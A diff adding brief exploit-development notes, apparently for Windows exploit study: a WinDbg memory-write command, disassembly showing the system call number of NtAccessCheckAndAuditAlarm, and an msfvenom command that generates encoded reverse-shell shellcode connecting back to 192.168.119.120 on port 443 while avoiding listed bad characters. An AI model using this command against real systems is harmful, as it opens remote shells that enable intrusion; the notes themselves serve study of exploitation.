@@ -1,0 +1,14 @@
+Write ASCII to memory - ea esp "Hello"
+
+Check for system call opcode
+0:001> u ntdll!NtAccessCheckAndAuditAlarm
+ntdll!NtAccessCheckAndAuditAlarm:
+76f20ec0 b8c6010000      mov     eax,1C6h           #  system call number is 0x1C6
+76f20ec5 e803000000      call    ntdll!NtAccessCheckAndAuditAlarm+0xd (76f20ecd)
+76f20eca c22c00          ret     2Ch
+76f20ecd 8bd4            mov     edx,esp
+76f20ecf 0f34            sysenter
+76f20ed1 c3              ret
+
+Shellcode generation
+    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.120 LPORT=443 -f python –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
